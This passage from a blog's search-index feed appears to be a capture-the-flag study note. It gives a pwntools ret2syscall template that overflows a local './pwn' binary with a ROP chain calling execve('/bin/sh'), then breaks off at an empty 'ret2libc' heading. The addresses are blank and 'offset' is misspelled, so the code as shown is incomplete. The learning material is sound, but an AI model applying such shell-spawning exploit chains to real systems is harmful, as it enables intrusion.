<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = </span><br><span class="line">rax_rdx_rbx_addr =</span><br><span class="line">rdi_addr =</span><br><span class="line">rsi_addr =</span><br><span class="line">binsh_addr =</span><br><span class="line">syscall_addr =</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offest+p64(rdi_addr)+p64(binsh_addr)+p64(rax_rdx_rbx_addr)+p64(<span class="number">0x3b</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0X0</span>)+p64(rsi_addr)+p64(<span class="number">0x0</span>)+p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<h2 id="VKYue"><font style="color:rgba(0, 0, 0, 0.87);">ret2libc</font></h2>
<font style="color:rgba(0, 0, 0, 0.87);"></font>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
